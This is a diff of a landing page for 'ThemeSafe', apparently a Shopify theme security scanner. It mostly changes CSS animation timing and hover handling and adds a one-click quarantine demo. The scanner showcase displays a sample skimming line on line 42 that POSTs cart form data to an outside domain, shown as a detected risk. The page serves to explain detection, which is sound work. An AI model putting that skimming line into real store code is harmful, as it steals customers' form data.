@@ -163,8 +163,13 @@
         --display: "Outfit", system-ui, -apple-system, sans-serif;
         --sans: "Plus Jakarta Sans", system-ui, -apple-system, sans-serif;
         --mono: "JetBrains Mono", ui-monospace, SFMono-Regular, Menlo, monospace;
-        --spring: cubic-bezier(0.32, 0.72, 0, 1);
-        --expo: cubic-bezier(0.16, 1, 0.3, 1);
+        /* Emil Kowalski custom easing curves */
+        --ease-out: cubic-bezier(0.23, 1, 0.32, 1);
+        --ease-in-out: cubic-bezier(0.77, 0, 0.175, 1);
+        --ease-drawer: cubic-bezier(0.32, 0.72, 0, 1);
+        --spring: var(--ease-drawer);
+        --expo: var(--ease-out);
+        scrollbar-color: rgba(45, 212, 191, 0.28) var(--bg);
       }
 
       [data-theme="light"] {
@@ -191,6 +196,7 @@
         --warn-soft: rgba(217, 119, 6, 0.12);
         --shadow-ambient: 0 24px 56px -18px rgba(11, 21, 38, 0.12);
         --glass-nav: rgba(255, 255, 255, 0.82);
+        scrollbar-color: rgba(13, 148, 136, 0.32) var(--bg);
       }
 
       * {
@@ -198,6 +204,16 @@
       }
       html {
         scroll-behavior: smooth;
+        caret-color: var(--accent);
+      }
+      /* Impeccable craft-floor: themed browser surfaces */
+      ::selection {
+        background: rgba(20, 184, 166, 0.26);
+        color: var(--ink);
+      }
+      :focus-visible {
+        outline: 2px solid var(--accent-strong);
+        outline-offset: 3px;
       }
       body {
         margin: 0;
@@ -212,19 +228,10 @@
         overflow-x: hidden;
       }
 
-      /* Fixed SVG film-grain overlay (GPU-safe, pointer-events: none, z-index 40) */
-      body::before {
-        content: "";
-        position: fixed;
-        inset: 0;
-        z-index: 40;
-        pointer-events: none;
-        opacity: 0.025;
-        background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)'/%3E%3C/svg%3E");
-      }
-
       a {
         color: inherit;
+        text-underline-offset: 4px;
+        text-decoration-thickness: 1px;
       }
       img,
       svg {
@@ -258,17 +265,30 @@
         font-variant-numeric: tabular-nums;
       }
 
-      /* ---------- Scroll Reveal Interpolation (GPU-safe transform + opacity only) ---------- */
+      /* ---------- Scroll Reveal Interpolation (Emil Kowalski: < 300ms, scale(0.985), ease-out) ---------- */
       .rv {
         opacity: 0;
-        transform: translateY(22px);
+        transform: translateY(14px) scale(0.985);
         transition:
-          opacity 0.75s var(--expo),
-          transform 0.75s var(--expo);
+          opacity 260ms var(--ease-out),
+          transform 260ms var(--ease-out);
       }
       .rv.in {
         opacity: 1;
-        transform: translateY(0);
+        transform: translateY(0) scale(1);
+      }
+
+      /* Emil Kowalski: Blur-masked crossfade when switching interactive tabs/stages */
+      .morph-target {
+        transition:
+          opacity 160ms var(--ease-out),
+          transform 160ms var(--ease-out),
+          filter 160ms var(--ease-out);
+      }
+      .morph-target.morph-switching {
+        opacity: 0.48;
+        transform: scale(0.992);
+        filter: blur(2px);
       }
       @media (prefers-reduced-motion: reduce) {
         html {
@@ -317,8 +337,8 @@
         align-items: center;
         gap: 18px;
         transition:
-          border-color 0.35s var(--spring),
-          box-shadow 0.35s var(--spring);
+          border-color 240ms var(--ease-out),
+          box-shadow 240ms var(--ease-out);
       }
       .island-header.elevated .island-nav {
         border-color: var(--accent-border);
@@ -355,12 +375,12 @@
         border-radius: 999px;
         white-space: nowrap;
         transition:
-          color 0.25s var(--spring),
-          background-color 0.25s var(--spring);
+          color 180ms var(--ease-out),
+          background-color 180ms var(--ease-out),
+          transform 160ms var(--ease-out);
       }
-      .nav-links a:hover {
-        color: var(--ink);
-        background: var(--shell-bg);
+      .nav-links a:active {
+        transform: scale(0.97);
       }
       .nav-actions {
         display: flex;
@@ -380,18 +400,13 @@
         justify-content: center;
         cursor: pointer;
         transition:
-          color 0.25s var(--spring),
-          border-color 0.25s var(--spring),
-          transform 0.2s var(--spring);
-      }
-      .theme-btn:hover,
-      .nav-toggle:hover {
-        color: var(--ink);
-        border-color: var(--accent-border);
+          color 180ms var(--ease-out),
+          border-color 180ms var(--ease-out),
+          transform 160ms var(--ease-out);
       }
       .theme-btn:active,
       .nav-toggle:active {
-        transform: scale(0.96);
+        transform: scale(0.97);
       }
       .nav-toggle {
         display: none;
@@ -415,16 +430,12 @@
         border: 1px solid transparent;
         cursor: pointer;
         transition:
-          transform 0.35s var(--spring),
-          background-color 0.35s var(--spring),
-          box-shadow 0.35s var(--spring);
-      }
-      .btn-island:hover {
-        background: var(--accent-strong);
-        box-shadow: 0 12px 28px -10px var(--accent);
+          transform 160ms var(--ease-out),
+          background-color 200ms var(--ease-out),
+          box-shadow 200ms var(--ease-out);
       }
       .btn-island:active {
-        transform: scale(0.98);
+        transform: scale(0.97);
       }
       .btn-island .btn-pod {
         width: 30px;
@@ -434,13 +445,10 @@
         display: inline-flex;
         align-items: center;
         justify-content: center;
-        transition: transform 0.35s var(--spring);
+        transition: transform 200ms var(--ease-out);
       }
       [data-theme="light"] .btn-island .btn-pod {
         background: rgba(255, 255, 255, 0.22);
-      }
-      .btn-island:hover .btn-pod {
-        transform: translate(2px, -2px) scale(1.05);
       }
 
       .btn-secondary {
@@ -459,16 +467,46 @@
         color: var(--ink);
         border: 1px solid var(--shell-border);
         transition:
-          border-color 0.3s var(--spring),
-          background-color 0.3s var(--spring),
-          transform 0.2s var(--spring);
-      }
-      .btn-secondary:hover {
-        border-color: var(--accent-border);
-        background: var(--accent-soft);
+          border-color 180ms var(--ease-out),
+          background-color 180ms var(--ease-out),
+          transform 160ms var(--ease-out);
       }
       .btn-secondary:active {
-        transform: scale(0.98);
+        transform: scale(0.97);
+      }
+
+      /* Emil Kowalski: Gate hover effects behind pointer: fine so touch devices never get stuck hovers */
+      @media (hover: hover) and (pointer: fine) {
+        .nav-links a:hover {
+          color: var(--ink);
+          background: var(--shell-bg);
+        }
+        .theme-btn:hover,
+        .nav-toggle:hover {
+          color: var(--ink);
+          border-color: var(--accent-border);
+        }
+        .btn-island:hover {
+          background: var(--accent-strong);
+          box-shadow: 0 12px 28px -10px var(--accent);
+        }
+        .btn-island:hover .btn-pod {
+          transform: translate(2px, -2px) scale(1.05);
+        }
+        .btn-secondary:hover {
+          border-color: var(--accent-border);
+          background: var(--accent-soft);
+        }
+        .file-tab:hover {
+          color: var(--ink);
+          border-color: var(--accent-border);
+        }
+        .pipeline-btn:hover {
+          border-color: var(--accent-border);
+        }
+        .remediate-btn:hover {
+          background: var(--accent-strong);
+        }
       }
 
       /* ---------- Double-Bezel (Doppelrand) Hardware Container ---------- */
@@ -595,13 +633,13 @@
         justify-content: space-between;
         gap: 6px;
         transition:
-          border-color 0.25s var(--spring),
-          background-color 0.25s var(--spring),
-          color 0.25s var(--spring);
+          border-color 180ms var(--ease-out),
+          background-color 180ms var(--ease-out),
+          color 180ms var(--ease-out),
+          transform 160ms var(--ease-out);
       }
-      .file-tab:hover {
-        color: var(--ink);
-        border-color: var(--accent-border);
+      .file-tab:active {
+        transform: scale(0.97);
       }
       .file-tab.active {
         background: var(--accent-soft);
@@ -691,6 +729,34 @@
         font-size: 0.82rem;
         color: var(--ink-2);
         line-height: 1.55;
+      }
+      .verdict-actions {
+        margin-top: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+        flex-wrap: wrap;
+      }
+      .remediate-btn {
+        font-family: var(--mono);
+        font-size: 0.72rem;
+        font-weight: 600;
+        padding: 6px 12px;
+        border-radius: 999px;
+        border: 1px solid transparent;
+        background: var(--accent);
+        color: var(--accent-ink);
+        cursor: pointer;
+        transition:
+          transform 160ms var(--ease-out),
+          background-color 180ms var(--ease-out);
+      }
+      .remediate-btn:active {
+        transform: scale(0.97);
+      }
+      .remediate-btn[hidden] {
+        display: none;
       }
 
       /* ==========================================================================
@@ -926,12 +992,12 @@
         color: var(--ink);
         cursor: pointer;
         transition:
-          border-color 0.3s var(--spring),
-          background-color 0.3s var(--spring),
-          transform 0.2s var(--spring);
+          border-color 180ms var(--ease-out),
+          background-color 180ms var(--ease-out),
+          transform 160ms var(--ease-out);
       }
-      .pipeline-btn:hover {
-        border-color: var(--accent-border);
+      .pipeline-btn:active {
+        transform: scale(0.97);
       }
       .pipeline-btn.active {
         border-color: var(--accent);
@@ -1451,7 +1517,7 @@
               <div class="scanner-tabs" role="tablist" aria-label="Select theme file to inspect">
                 <button class="file-tab active" type="button" role="tab" aria-selected="true" data-file="0">
                   <span>promo-popup.js</span>
-                  <span class="status-chip chip-risk">Risk</span>
+                  <span class="status-chip chip-risk" id="firstTabChip">Risk</span>
                 </button>
                 <button class="file-tab" type="button" role="tab" aria-selected="false" data-file="1">
                   <span>header.liquid</span>
@@ -1463,14 +1529,14 @@
                 </button>
               </div>
 
-              <div class="scanner-code-view" id="heroCodeView" aria-live="polite">
+              <div class="scanner-code-view morph-target" id="heroCodeView" aria-live="polite">
                 <div class="code-line"><span class="ln">40</span><span>const cartForm = document.querySelector('form[action="/cart"]');</span></div>
                 <div class="code-line"><span class="ln">41</span><span>if (cartForm) {</span></div>
                 <div class="code-line flagged-risk"><span class="ln">42</span><span>  fetch('https://cdn.quick-deals-track.net/collect', { method: 'POST', body: new FormData(cartForm) });</span></div>
                 <div class="code-line"><span class="ln">43</span><span>}</span></div>
               </div>
 
-              <div class="scanner-verdict">
+              <div class="scanner-verdict morph-target" id="heroVerdictCard">
                 <div class="scanner-verdict-head">
                   <span id="heroVerdictTitle">AI Security Finding: Unverified outbound payload</span>
                   <span class="tabular" id="heroVerdictMeta">Rule #TS-402</span>
@@ -1478,6 +1544,11 @@
                 <p id="heroVerdictBody">
                   Line 42 serializes cart form inputs and posts them to an external domain registered 4 days ago. ThemeSafe flagged this edit within 30 seconds of saving.
                 </p>
+                <div class="verdict-actions">
+                  <button class="remediate-btn" id="heroRemediateBtn" type="button">
+                    Quarantine Risk (1-Click Fix)
+                  </button>
+                </div>
               </div>
             </div>
           </div>
@@ -1648,8 +1719,7 @@
       <section class="workbench-section" id="themesafe-security">
         <div class="wrap workbench-grid">
           <div class="rv">
-            <span class="eyebrow-pill">Hybrid AI Security Engine</span>
-            <h2 style="font-family: var(--display); font-size: clamp(1.95rem, 3.2vw, 2.7rem); font-weight: 800; letter-spacing: -0.025em; line-height: 1.1; margin: 18px 0 14px">
+            <h2 style="font-family: var(--display); font-size: clamp(1.95rem, 3.2vw, 2.7rem); font-weight: 800; letter-spacing: -0.025em; line-height: 1.1; margin: 0 0 14px">
               An AI security engineer watching every theme edit.
             </h2>
             <p style="color: var(--ink-2); margin: 0">
@@ -1679,7 +1749,7 @@
                 <span id="wbFileHeader">layout/theme.liquid · OAuth Snapshot #312</span>
                 <span class="status-chip chip-clean" id="wbStatusBadge">312 Files Indexed</span>
               </div>
-              <div class="diff-body">
+              <div class="diff-body morph-target" id="wbDiffBody">
                 <pre class="diff-code" id="wbCodeBlock"><code>&lt;!-- Dawn 15.2.0 · Read-only Shopify Admin API sync --&gt;
 &lt;script src="{{ 'constants.js' | asset_url }}" defer="defer"&gt;&lt;/script&gt;
 &lt;script src="{{ 'pubsub.js' | asset_url }}" defer="defer"&gt;&lt;/script&gt;
@@ -1981,7 +2051,25 @@
         showAll();
       }
 
-      // 4. Interactive Hero ThemeSafe Live Scanner
+      // Emil Kowalski helper: Blur-masked crossfade when switching states
+      function morphSwap(elements, updateFn) {
+        if (reduceMotion) {
+          updateFn();
+          return;
+        }
+        elements.forEach(function (el) {
+          if (el) el.classList.add('morph-switching');
+        });
+        setTimeout(function () {
+          updateFn();
+          elements.forEach(function (el) {
+            if (el) el.classList.remove('morph-switching');
+          });
+        }, 120);
+      }
+
+      // 4. Interactive Hero ThemeSafe Live Scanner + Impeccable 1-Click Quarantine Delight
+      var isQuarantined = false;
       var heroFiles = [
         {
           score: 'Score 92/100',
@@ -2036,12 +2124,65 @@
         }
       ];
 
+      var quarantinedFile0 = {
+        score: 'Score 100/100 · Protected',
+        scoreCls: 'status-chip chip-clean tabular',
+        lines: [
+          { ln: '40', code: 'const cartForm = document.querySelector(\'form[action="/cart"]\');', cls: '' },
+          { ln: '41', code: 'if (cartForm) {', cls: '' },
+          {
+            ln: '42',
+            code: '  // [ThemeSafe Quarantined #TS-402] Blocked outbound POST to quick-deals-track.net',
+            cls: 'flagged-clean'
+          },
+          { ln: '43', code: '}', cls: '' }
+        ],
+        title: 'Remediated: Malicious outbound payload neutralized',
+        meta: 'Snapshot Restored',
+        body: 'Line 42 has been safely quarantined and backed up to your audit log. Storefront checkout and cart forms are 100% clean.'
+      };
+
+      var activeFileIdx = 0;
       var fileTabs = document.querySelectorAll('.file-tab');
       var heroCodeView = document.getElementById('heroCodeView');
+      var heroVerdictCard = document.getElementById('heroVerdictCard');
       var heroScanScore = document.getElementById('heroScanScore');
       var heroVerdictTitle = document.getElementById('heroVerdictTitle');
       var heroVerdictMeta = document.getElementById('heroVerdictMeta');
       var heroVerdictBody = document.getElementById('heroVerdictBody');
+      var heroRemediateBtn = document.getElementById('heroRemediateBtn');
+      var firstTabChip = document.getElementById('firstTabChip');
+
+      function renderHeroFile(idx) {
+        var item = idx === 0 && isQuarantined ? quarantinedFile0 : heroFiles[idx];
+        heroScanScore.textContent = item.score;
+        heroScanScore.className = item.scoreCls;
+        heroVerdictTitle.textContent = item.title;
+        heroVerdictMeta.textContent = item.meta;
+        heroVerdictBody.textContent = item.body;
+        if (heroRemediateBtn) {
+          if (idx === 0) {
+            heroRemediateBtn.hidden = false;
+            heroRemediateBtn.textContent = isQuarantined ? 'Inspect Original Risk Finding' : 'Quarantine Risk (1-Click Fix)';
+          } else {
+            heroRemediateBtn.hidden = true;
+          }
+        }
+        heroCodeView.innerHTML = item.lines
+          .map(function (l) {
+            var escaped = l.code.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+            return (
+              '<div class="code-line ' +
+              l.cls +
+              '"><span class="ln">' +
+              l.ln +
+              '</span><span>' +
+              escaped +
+              '</span></div>'
+            );
+          })
+          .join('');
+      }
 
       fileTabs.forEach(function (tab) {
         tab.addEventListener('click', function () {
@@ -2051,28 +2192,25 @@
           });
           tab.classList.add('active');
           tab.setAttribute('aria-selected', 'true');
-          var item = heroFiles[Number(tab.getAttribute('data-file'))];
-          heroScanScore.textContent = item.score;
-          heroScanScore.className = item.scoreCls;
-          heroVerdictTitle.textContent = item.title;
-          heroVerdictMeta.textContent = item.meta;
-          heroVerdictBody.textContent = item.body;
-          heroCodeView.innerHTML = item.lines
-            .map(function (l) {
-              var escaped = l.code.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
-              return (
-                '<div class="code-line ' +
-                l.cls +
-                '"><span class="ln">' +
-                l.ln +
-                '</span><span>' +
-                escaped +
-                '</span></div>'
-              );
-            })
-            .join('');
+          activeFileIdx = Number(tab.getAttribute('data-file'));
+          morphSwap([heroCodeView, heroVerdictCard], function () {
+            renderHeroFile(activeFileIdx);
+          });
         });
       });
+
+      if (heroRemediateBtn) {
+        heroRemediateBtn.addEventListener('click', function () {
+          isQuarantined = !isQuarantined;
+          if (firstTabChip) {
+            firstTabChip.textContent = isQuarantined ? 'Fixed' : 'Risk';
+            firstTabChip.className = isQuarantined ? 'status-chip chip-clean' : 'status-chip chip-risk';
+          }
+          morphSwap([heroCodeView, heroVerdictCard], function () {
+            renderHeroFile(0);
+          });
+        });
+      }
 
       // 5. Interactive Workbench Pipeline Switcher
       var wbStages = [
@@ -2103,6 +2241,7 @@
       ];
 
       var pipelineBtns = document.querySelectorAll('.pipeline-btn');
+      var wbDiffBody = document.getElementById('wbDiffBody');
       var wbFileHeader = document.getElementById('wbFileHeader');
       var wbStatusBadge = document.getElementById('wbStatusBadge');
       var wbCodeBlock = document.getElementById('wbCodeBlock');
@@ -2118,12 +2257,14 @@
           btn.classList.add('active');
           btn.setAttribute('aria-selected', 'true');
           var s = wbStages[Number(btn.getAttribute('data-stage'))];
-          wbFileHeader.textContent = s.header;
-          wbStatusBadge.textContent = s.badge;
-          wbStatusBadge.className = s.badgeCls;
-          wbCodeBlock.innerHTML = '<code>' + s.code + '</code>';
-          wbNoteTitle.textContent = s.title;
-          wbNoteBody.textContent = s.body;
+          morphSwap([wbDiffBody], function () {
+            wbFileHeader.textContent = s.header;
+            wbStatusBadge.textContent = s.badge;
+            wbStatusBadge.className = s.badgeCls;
+            wbCodeBlock.innerHTML = '<code>' + s.code + '</code>';
+            wbNoteTitle.textContent = s.title;
+            wbNoteBody.textContent = s.body;
+          });
         });
       });
     </script>
